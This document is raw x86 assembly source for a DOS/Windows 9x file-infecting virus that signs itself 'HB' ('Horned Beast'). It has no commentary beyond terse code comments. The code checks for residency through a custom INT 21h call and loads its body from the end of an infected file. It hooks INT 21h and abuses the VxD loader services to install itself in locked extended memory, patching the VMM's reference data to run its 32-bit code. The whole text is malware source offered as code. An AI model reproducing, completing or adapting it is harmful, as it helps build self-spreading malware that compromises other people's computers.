   .Model Tiny
   .Code
   .386

   include DOS.INC
   include EXTRA.INC

   .Radix 16d
   org (size PSP)

   Control_Distance = 1234 ;Fix
   Virus_Main_Size = 1234 ;Fix
   Virus_Physical_Size = 1234 ;Fix
   Virus_Virtual_Size = 1234 ;Fix
   Return_IP_Distance = Return_IP-Real_Mode_Start
   Ref_Patch_Size = Ref_Patch_End-Ref_Patch_Start
   Loader_Size = Loader_End-Real_Mode_Start
   Real_Mode_Size = Real_Mode_End-Real_Mode_Start
   Virus_Sign = 'HB' ;"Horned Beast"

   Real_Mode_Start:
   pop bp ;Return address
   push bp bp bp cs
   push 1234
   Return_IP = $-2
   pushad
   mov ax,3303
   mov bx,Virus_Sign
   int 21 ;Residency check
   or ax,ax
   jnz Not_Resident
   push bx ;Virus CS
   push Reload_File-Real_Mode_Start
   retf
   Not_Resident:
   mov ah,48
   mov bx,(Virus_Main_Size+15d)/16d
   int 21 ;Allocate memory
   jc $ ;Hang if no memory
   xchg bp,ax
   mov si,Virus_Physical_Size
   mov di,Virus_Main_Size
   call Read_File
   push bp
   push Mem_Return-Real_Mode_Start
   retf

   ;Read the last accessed file at position EOF-SI to the address at BP:0,
   ;until position EOF-SI+DI
   ;Save and restore the file pointer
   Read_File:
   push ds es
   mov ah,34
   int 21 ;Get address of "InDOS flag"
   mov bx,word ptr es:[bx+28ch-1] ;File handle
   mov ax,4201
   xor cx,cx
   cwd
   int 21
   push ax dx
   mov ax,4202
   cwd
   int 21
   xchg dx,ax
   xchg cx,ax
   sub dx,si
   sbb cx,ax
   mov ah,42
   int 21
   mov ah,3fh
   mov cx,di
   cwd
   mov ds,bp
   int 21
   pop cx dx
   mov ax,4200
   int 21
   pop es ds
   retn

   Loader_End:

   Mem_Return:
   push ds cs
   pop ds
   mov ax,3521
   int 21 ;Get interrupt vector
   mov si,Save_i21-Real_Mode_Start
   mov word ptr ds:[si],bx
   mov word ptr ds:[si+2],es
   mov ah,25
   mov dx,Handler_i21-Real_Mode_Start
   int 21 ;Set interrupt vector
   pop ds
   Reload_File:
   mov bp,ds
   mov si,Loader_Size
   mov di,si
   call Read_File
   popad
   push ds
   pop es
   mov bp,sp
   mov word ptr ss:[bp+6],Mem_Return2-Real_Mode_Start
   mov word ptr ss:[bp+8],cs
   mov dword ptr cs:[Service_Call-Real_Mode_Start],ecx ;LDRSRV address
   retf ;Call the original real-mode init proc

   Mem_Return2:
   push ds
   pushad
   or ax,ax ;Same as: cmp ax,DEVICE_LOAD_OK
   jnz Return_to_VMM
   push cs
   pop ds
   mov dword ptr ds:[Reference-Real_Mode_Start],edx ;Save reference data
   cmp byte ptr ds:[Loading_Switch-Real_Mode_Start],0
   jne Skip_Virus_Alloc ;Virus already in extended memory
   mov cx,Virus_Virtual_Size
   mov dx,LDRSRV_COPY_LOCKED
   xor si,si
   call Allocate_Extended
   add eax,Control_Distance
   mov dword ptr ds:[Ext_Virus_Start-Real_Mode_Start],eax
   inc byte ptr ds:[Loading_Switch-Real_Mode_Start]
   push es cs
   pop es
   mov ah,4ah
   mov bx,(Real_Mode_Size+15d)/16d
   int 21 ;Discard unused memory
   pop es
   Skip_Virus_Alloc:
   mov cx,Ref_Patch_Size
   mov dx,LDRSRV_COPY_INIT
   mov si,Ref_Patch_Start-Real_Mode_Start
   call Allocate_Extended
   mov bp,sp
   mov dword ptr ss:[bp.Pushad_EDX],eax ;Modify reference data
   Return_to_VMM:
   popad
   pop ds
   retf ;Return to the VMM

   Allocate_Extended: ;Allocate extended memory
   mov ax,LDRSRV_COPY_EXTENDED_MEMORY
   db 9ah ;Call XXXX:XXXX
   Service_Call dd 0
   jc $ ;Hang if no memory
   retn

   ;Interrupt vector handler
   Handler_i21:
   pushf
   cmp ax,3303
   jne Old_i21
   cmp bx,Virus_Sign
   jne Old_i21
   xor ax,ax
   mov bx,cs
   popf
   iret
   Old_i21:
   popf
   db 0eah ;Jmp XXXX:XXXX
   Save_i21 dd 0

   Ref_Patch_Start: ;32-bit code!
   mov dx,1234
   org $-2
   Reference dd 0
   push 1234
   org $-2
   Ext_Virus_Start dd 0
   ret
   Ref_Patch_End: ;End of 32-bit code

   Loading_Switch db 0

   Real_Mode_End:

   end Real_Mode_Start
